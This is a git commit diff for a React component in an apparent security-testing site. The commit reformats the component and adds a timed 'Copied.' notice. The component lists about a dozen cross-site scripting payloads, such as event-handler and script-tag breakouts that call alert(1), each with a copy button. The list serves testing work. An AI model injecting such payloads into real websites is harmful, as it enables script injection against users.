1ddcef702c553ce239cf99acbf54a812721d2a61
Codefreak69 <iamvikashkumar30@gmail.com>
2022-10-22 14:24:19 +0530

    Fixed the design of copy to clipboard #29

--- src/components/Payloads/Payloads.tsx
+++ src/components/Payloads/Payloads.tsx
@@ -1,60 +1,73 @@
-import React, {useState} from "react";
-import SyntaxHighlighter from 'react-syntax-highlighter';
-import {CopyToClipboard} from 'react-copy-to-clipboard';
+import React, { useState } from "react";
+import SyntaxHighlighter from "react-syntax-highlighter";
+import { CopyToClipboard } from "react-copy-to-clipboard";
 import {
-    CopyToClipboardIcon,
-    PayloadsContainer,
-    PayloadsCopyToClipboard,
-    PayloadsHeading,
-    SyntaxHighlighterDesign
-} from "./PayloadsElements";import {AiOutlineCopy} from 'react-icons/ai';
-import {docco} from 'react-syntax-highlighter/dist/esm/styles/hljs';
+  CopiedText,
+  CopyToClipboardIcon,
+  PayloadsContainer,
+  PayloadsCopyToClipboard,
+  PayloadsHeading,
+  SyntaxHighlighterDesign,
+} from "./PayloadsElements";
+import { AiOutlineCopy } from "react-icons/ai";
+import { docco } from "react-syntax-highlighter/dist/esm/styles/hljs";
 
 const Payloads = () => {
+  const PayloadsList = [
+    "onload=alert(1)><svg/1=",
+    ">alert(1)</script><script/1=",
+    '<a draggable="true" ondrag="alert(1)">test</a>',
+    '<a draggable="true" ondragend="alert(1)">test</a>',
+    '<a draggable="true" ondragenter="alert(1)">test</a>',
+    '<a draggable="true" ondragleave="alert(1)">test</a>',
+    '<a draggable="true" ondragstart="alert(1)">test</a>',
+    '<a onmouseenter="alert(1)">test</a>',
+    '<a onmouseleave="alert(1)">test</a>',
+    '<a onmousemove="alert(1)">test</a>',
+    '<a onmouseout="alert(1)">test</a>',
+    '<a onmouseover="alert(1)">test</a>',
+    '<a onmouseup="alert(1)">test</a>',
+  ];
 
-    const PayloadsList = [
-        "onload=alert(1)><svg/1=",
-        ">alert(1)</script><script/1=",
-        '<a draggable="true" ondrag="alert(1)">test</a>',
-        '<a draggable="true" ondragend="alert(1)">test</a>',
-        '<a draggable="true" ondragenter="alert(1)">test</a>',
-        '<a draggable="true" ondragleave="alert(1)">test</a>',
-        '<a draggable="true" ondragstart="alert(1)">test</a>',
-        '<a onmouseenter="alert(1)">test</a>',
-        '<a onmouseleave="alert(1)">test</a>',
-        '<a onmousemove="alert(1)">test</a>',
-        '<a onmouseout="alert(1)">test</a>',
-        '<a onmouseover="alert(1)">test</a>',
-        '<a onmouseup="alert(1)">test</a>',
-    ];
+  const [state, setState] = useState({
+    value: "",
+    copied: false,
+  });
 
-    const [state, setState] = useState({
-        value: '',
-        copied: false,
-    });
-
-    const PayloadsListMap = PayloadsList.map((payload, index) => {
-        return (
-            <PayloadsCopyToClipboard key={index}>
-                <SyntaxHighlighterDesign language="javascript" style={docco}>
-                    {payload}
-                </SyntaxHighlighterDesign>
-                <CopyToClipboard text={payload} onCopy={() => setState({value, copied: true})}>
-                    <CopyToClipboardIcon>
-                        <AiOutlineCopy/>
-                    </CopyToClipboardIcon>
-                </CopyToClipboard>
-            </PayloadsCopyToClipboard>
-        );
-    });
-
+  const PayloadsListMap = PayloadsList.map((payload, index) => {
     return (
-        <PayloadsContainer>
-            <PayloadsHeading>Payloads</PayloadsHeading>
-            {PayloadsListMap}
-            {state.copied ? <span style={{color: 'red'}}>Copied.</span> : null}
-        </PayloadsContainer>
+      <PayloadsCopyToClipboard key={index}>
+        <SyntaxHighlighterDesign language="javascript" style={docco}>
+          {payload}
+        </SyntaxHighlighterDesign>
+        <CopyToClipboard
+          text={payload}
+          onCopy={() => {
+            setState({ value: payload, copied: true });
+            setTimeout(() => {
+              setState({ copied: false });
+            }, 2000);
+          }}
+        >
+          <CopyToClipboardIcon>
+            <AiOutlineCopy />
+          </CopyToClipboardIcon>
+        </CopyToClipboard>
+      </PayloadsCopyToClipboard>
     );
+  });
+
+  // show the Copied text component only for two seconds
+
+  return (
+    <PayloadsContainer>
+      <PayloadsHeading>Payloads</PayloadsHeading>
+      {state.copied && (
+        <CopiedText style={{ color: "red" }}>Copied.</CopiedText>
+      )}
+      {PayloadsListMap}
+    </PayloadsContainer>
+  );
 };
 
 export default Payloads;
